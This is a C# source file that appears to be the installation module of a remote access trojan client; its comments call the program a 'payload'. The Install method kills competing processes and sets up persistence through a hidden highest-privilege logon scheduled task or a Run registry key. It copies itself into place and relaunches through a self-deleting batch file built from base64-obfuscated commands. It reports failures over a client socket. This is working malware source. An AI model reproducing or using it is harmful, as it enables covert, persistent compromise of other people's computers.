using Client.Connection;
using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;


namespace Client.Install
{
    class NormalStartup
    {


        //设置了一些参数，包括函数返回值的数据类型为布尔型、函数名为 "MoveFileEx"、函数传入参数的数据类型为字符串类型
        //并设置了函数传入参数的名称和 "dwFlags" 参数的数据类型为上文定义的 "MoveFileFlags" 枚举类型
        public static void Install()
        {
            try
            {
                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder), Settings.Install_File));
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;//获取当前进程的可执行文件名

                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                {

                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                    {
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch { }
                    }

                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                    {


                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }

                    else
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\" + @"Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");

                        }
                    }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Methods.ClientOnExit();

                    string batch = Path.GetTempFileName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 4 > NUL");
                        sw.WriteLine(System.Text.Encoding.Default.GetString(Convert.FromBase64String("U1RBUlQg")) + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine(System.Text.Encoding.Default.GetString(Convert.FromBase64String("Q0Qg")) + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }

                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
                ClientSocket.Error("Install Failed : " + ex.Message);
            }
        }

    }
}
